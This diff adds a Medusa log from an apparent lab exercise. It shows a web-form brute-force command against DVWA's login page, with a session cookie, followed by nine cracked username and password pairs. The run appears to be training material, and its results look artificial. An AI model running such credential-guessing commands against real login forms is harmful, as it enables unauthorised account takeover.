@@ -1,0 +1,12 @@
+# Medusa v.2.3 (2026-10-29 15:05:41)
+# medusa -h 172.28.0.11 -U /wordlists/trial1-users.txt -P /wordlists/trial1-passwords.txt -M web-form -m FORM:/DVWA/vulnerabilities/brute/ -m DENY-SIGNAL:Username and/or password incorrect -m FORM-DATA:get?username=&password=&Login=Login -m CUSTOM-HEADER:Cookie: security=low; PHPSESSID=rkfio6h0dtg09l113uq5kvr783 -t 5 -v 4 -O /logs/medusa-web-20261029-120540.log 
+2026-10-29 15:06:25 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: admin Password: 74lg [SUCCESS]
+2026-10-29 15:06:57 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: administrator Password: 52jk [SUCCESS]
+2026-10-29 15:07:57 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: root Password: 92jc [SUCCESS]
+2026-10-29 15:08:20 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: user Password: 36jw [SUCCESS]
+2026-10-29 15:09:18 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: test Password: 90jc [SUCCESS]
+2026-10-29 15:10:16 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: guest Password: 90py [SUCCESS]
+2026-10-29 15:10:23 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: support Password: 10ny [SUCCESS]
+2026-10-29 15:10:30 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: backup Password: 12ab [SUCCESS]
+2026-10-29 15:11:21 ACCOUNT FOUND: [web-form] Host: 172.28.0.11 User: adm Password: 76tu [SUCCESS]
+# Medusa has finished (2026-10-29 15:11:21).
